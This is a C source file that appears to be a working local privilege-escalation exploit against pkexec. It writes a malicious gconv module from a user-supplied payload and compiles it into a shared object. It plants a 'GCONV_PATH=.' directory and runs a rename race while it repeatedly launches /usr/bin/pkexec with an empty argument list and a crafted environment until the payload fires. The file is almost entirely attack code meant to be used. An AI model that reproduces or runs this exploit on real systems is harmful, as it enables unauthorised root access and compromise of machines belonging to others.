#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>

void read_payload(char *payload_file, char **payload_contents) {
  FILE *pfp = NULL;
  struct stat payload_stats = {0};
  size_t bytes_read = 0;

  if (NULL == payload_contents) {
    fprintf(stderr, "[-] Can't read to NULL ptr\n");
    goto exit;
  }

  if (0 > stat(payload_file, &payload_stats)) {
    fprintf(stderr, "[-] Failed to stat payload file\n");
    *payload_contents = NULL;
    goto exit;
  }

  if (NULL == (pfp = fopen(payload_file, "r"))) {
    fprintf(stderr, "[-] Failed to open payload file\n");
    *payload_contents = NULL;
    goto exit;
  }

  *payload_contents = calloc(payload_stats.st_size, sizeof(char));
  if (NULL == *payload_contents) {
    fprintf(stderr, "[-] Failed calloc for payload\n");
    *payload_contents = NULL;
    goto exit;
  }

  bytes_read =
      fread(*payload_contents, sizeof(char), payload_stats.st_size, pfp);
  if (bytes_read != payload_stats.st_size) {
    fprintf(stderr, "[-] Failed to read full payload: %ld of %ld\n", bytes_read,
            payload_stats.st_size);
    free(*payload_contents);
    *payload_contents = NULL;
  }

exit:
  if (NULL != pfp) {
    fclose(pfp);
  }
  return;
}

void setup(char *payload_file) {
  FILE *fp = NULL;
  char *pl_contents = NULL;

  read_payload(payload_file, &pl_contents);

  if (NULL == pl_contents) {
    fprintf(stderr, "[-] Unable to setup exploit\n");
    exit(1);
  }

  system("rm g2g");

  // GCONV_PATH setup
  mkdir("GCONV_PATH=.", 0700);
  system("touch GCONV_PATH=./privesc");
  system("chmod a+x GCONV_PATH=./privesc");

  // GConv Module Setup
  system("mkdir -p privesc");
  system("echo 'module UTF-8// PRIVESC// privesc 2' > privesc/gconv-modules");

  // Malicious Module
  fp = fopen("privesc/privesc.c", "w");
  fprintf(fp, "%s", pl_contents);
  fclose(fp);
  free(pl_contents);

  system("gcc -o privesc/privesc.so -shared -fPIC privesc/privesc.c ");
}

void race() {
  // keep racing while payload didnt trigger
  for (; 0 != access("g2g", F_OK);) {
    rename("GCONV_PATH=./privesc", "GCONV_PATH=./race");
    rename("GCONV_PATH=./race", "GCONV_PATH=./privesc");
  }
}

int main(int argc, char *argv[]) {
  int ret = 0;
  pid_t pkid, rid, w = 0;
  int wstatus = 0;
  char *pk_path = "/usr/bin/pkexec";

  char *args[] = {NULL};
  char *env[] = {"privesc", "PATH=GCONV_PATH=.", "CHARSET=PRIVESC", NULL};

  if (argc < 2 || argv[1] == NULL) {
    fprintf(stderr, "[-] Need Payload C File for Malicious SO\n");
    ret = 1;
    goto exit;
  }

  setup(argv[1]);

  // start race condition setup
  if (0 == fork()) {
    race();
  }

  // loop to keep attempting to win race
  for (;;) {
    // if the payload triggered stop attempting
    if (0 == access("g2g", F_OK)) {
      usleep(1000);
      break;
    }
    // need to fork again since execve replaces the process
    if (0 == fork()) {
      // fork again to avoid the syslog nonauth error
      // instead will go down the "dead parent" error path
      if (0 == fork()) {
        execve(pk_path, args, env);
      } else {
        exit(EXIT_FAILURE);
      }
    }
  }

  // remain open so the payload keeps running
  // need CTRL-C after exiting payload
  do {
    usleep(1000);
  } while (1);

exit:
  return ret;
}